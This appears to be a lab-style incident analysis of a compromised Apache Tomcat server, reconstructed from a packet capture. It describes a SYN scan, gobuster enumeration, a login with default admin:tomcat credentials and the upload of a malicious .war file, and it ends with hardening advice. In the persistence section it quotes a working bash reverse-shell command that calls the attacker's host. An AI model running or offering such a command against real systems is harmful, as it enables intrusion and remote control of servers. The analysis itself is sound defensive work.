# Apache Tomcat Web Server Compromise - Incident Analysis

## Overview

Our SOC team detected suspicious activity originating from an external IP address targeting an Apache Tomcat web server within the company's intranet. This investigation leverages the analysis of the captured pcap file, uncovering a series of malicious activities that indicate a successful compromise of the web server. Below is the detailed breakdown of the incident, including IP addresses, ports involved, and attacker methodologies.

## IP Address Analysis

| IP Address     | Description                                       |
| -------------- | ------------------------------------------------- |
| 14.0.0.120     | External IP; Threat Actor                         |
| 10.0.0.112     | SSH Server & Apache Tomcat/7.0.88                |
| 10.0.0.115     | CyberDefenders - Virtual Machine (Ubuntu - root) |
| 10.0.0.105     | SMB/File Share Server                             |

## Port Activity

The following ports were actively used during the attack:
- **8080** - Apache Tomcat Web Server
- **22** - SSH
- **445** - SMB File Sharing
- **80** - HTTP
- **443** - HTTPS

### Attack Timeline

1. **SYN Scan Detection**:
   - The attacker (14.0.0.120) was observed sending a large volume of SYN requests, indicating an active SYN scan against the network. The attacker successfully identified open ports: **8080**, **22**, and **8009** on the SSH server (10.0.0.112).

2. **Suspicious POST Request**:
   - At **18:22:14**, the attacker uploaded a file via a POST request to the Tomcat server (10.0.0.112). The file appears to be a **PK file**, likely compressed as a **ZIP** archive.

3. **Default Credentials Exploited**:
   - In **packet 20553**, a successful login attempt was captured using the credentials **admin:tomcat**, which were likely unchanged from the default setup.

## Attack Summary and Analysis

### 1. Identifying the Attacker
- **Source IP**: 14.0.0.120
- **Origin**: Guangzhou

### 2. Open Port Vulnerability
- **Port Access**: The attacker's scan revealed that **8080** is used for the Apache Tomcat web server's admin panel.

### 3. Enumeration Tool Identified
- **Tool Used**: `gobuster`
  - The attacker utilized this tool to enumerate directories and files on the web server.

### 4. Directory Uncovered
- **Discovered Path**: `/manager`
  - The attacker discovered the `/manager` directory, which led to access to the admin panel.

### 5. Brute-Force Attack
- **Credentials Used**: `admin:tomcat`
  - The attacker successfully brute-forced the login credentials, exploiting the default settings.

### 6. Malicious File Upload
- **File Name**: `JXQOZY.war`
  - The attacker uploaded a malicious `.war` file intending to establish a reverse shell on the compromised server.

### 7. Persistence Command
- **Scheduled Command**: `/bin/bash -c 'bash -i >& /dev/tcp/14.0.0.120/443 0>&1'`
  - This command was used to establish a reverse shell and maintain persistence on the compromised system.

## Recommendations

1. **Immediate Action**: Isolate the compromised web server (10.0.0.112) from the network to prevent further damage or data exfiltration.
2. **Credential Review**: Ensure all default credentials are updated across all servers and services, especially those accessible via the internet.
3. **Firewall Policies**: Restrict access to sensitive ports such as **8080** and **22** to trusted IPs only.
4. **File Integrity Monitoring**: Set up monitoring on critical directories such as `/manager` to detect unauthorized uploads or changes in real-time.
5. **Incident Response**: Conduct a comprehensive review of server logs and deploy endpoint detection and response (EDR) tools to identify any further compromise or lateral movement by the attacker.

---

This analysis highlights the importance of securing administrative interfaces and regularly auditing server configurations to prevent similar incidents in the future. Stay vigilant and ensure your systems are hardened against common attack vectors.
